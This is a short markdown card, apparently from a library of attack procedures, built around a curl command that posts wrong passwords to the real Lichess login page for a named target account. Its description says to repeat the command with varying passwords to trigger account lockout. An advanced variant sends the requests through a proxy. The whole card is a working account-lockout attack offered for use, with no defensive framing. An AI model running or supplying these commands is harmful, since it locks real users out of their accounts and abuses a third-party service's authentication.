---
id: cmd-curl-failed-login
data: >-
  curl -X POST https://lichess.org/login -d "username=targetuser" -d
  "password=wrongpass123" -d "next=https://lichess.org"
tags:
  - web
  - auth
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:52.589Z'
verified: false
validated: true
submitted: true
---
# curl-failed-login

## Command

```bash
curl -X POST https://lichess.org/login -d "username=targetuser" -d "password=wrongpass123" -d "next=https://lichess.org"
```

## Description

Sends a failed login attempt to Lichess to contribute to throttling. Use repeatedly with varying wrong passwords to trigger lockout.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-d "username=targetuser"` | Target username | Yes |
| `-d "password=wrongpass123"` | Incorrect password | Yes |
| `-d "next=https://lichess.org"` | Redirect URL post-login | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://lichess.org/login -d "username=targetuser" -d "password=wrong1" -d "next=https://lichess.org"
```

### Advanced Usage

```bash
curl -X POST https://lichess.org/login -d "username=targetuser" -d "password=wrong2" -d "next=https://lichess.org" --proxy http://proxy:8080
```

## Expected Output

HTML response with error: "Invalid username or password". No blocking until threshold.

## Related

- [[Related Procedure|Perform-Failed-Login-Attempts]]
